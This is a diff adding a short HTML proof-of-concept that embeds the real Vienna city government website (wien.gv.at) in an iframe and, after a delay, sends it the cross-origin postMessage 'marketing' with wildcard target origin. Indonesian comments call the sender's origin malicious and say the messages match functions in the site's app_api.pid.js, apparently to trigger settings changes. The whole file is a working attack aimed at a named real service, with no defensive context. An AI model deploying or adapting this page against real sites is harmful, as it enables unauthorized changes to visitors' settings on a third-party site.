@@ -1,0 +1,14 @@
+<html>
+<body>
+<iframe id="victim" src="https://www.wien.gv.at/" width="500" height="500"></iframe>
+<script>
+    var victim = document.getElementById("victim");
+    // Tunggu load
+    setTimeout(function() {
+        // Target Origin harus *, karena kita ingin pesan masuk walau origin kita 'jahat'
+        // Pesan "marketing" atau "saveSettings" sesuai fungsi di app_api.pid.js
+        victim.contentWindow.postMessage("marketing", "*"); 
+    }, 5000);
+</script>
+</body>
+</html>
